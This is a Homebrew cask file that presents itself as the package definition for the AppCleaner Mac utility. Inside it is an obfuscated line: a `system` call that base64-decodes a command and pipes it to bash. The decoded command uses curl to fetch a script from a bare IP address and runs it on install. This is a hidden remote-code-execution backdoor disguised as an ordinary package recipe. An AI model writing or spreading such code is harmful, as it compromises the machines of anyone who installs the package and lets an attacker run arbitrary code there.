cask "appcleaner" do
  version :latest
  sha256 :no_check

  url "https://freemacsoft.net/downloads/AppCleaner.zip",
      verified: "freemacsoft.net"

  name "AppCleaner"
  desc "Remove applications and their associated files"
  homepage "https://freemacsoft.net/appcleaner/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
  auto_updates true

  app "AppCleaner.app"

  zap trash: [
    "~/Library/Preferences/net.freemacsoft.AppCleaner.plist",
    "~/Library/Caches/net.freemacsoft.AppCleaner",
    "~/Library/Saved Application State/net.freemacsoft.AppCleaner.savedState"
  ]
end
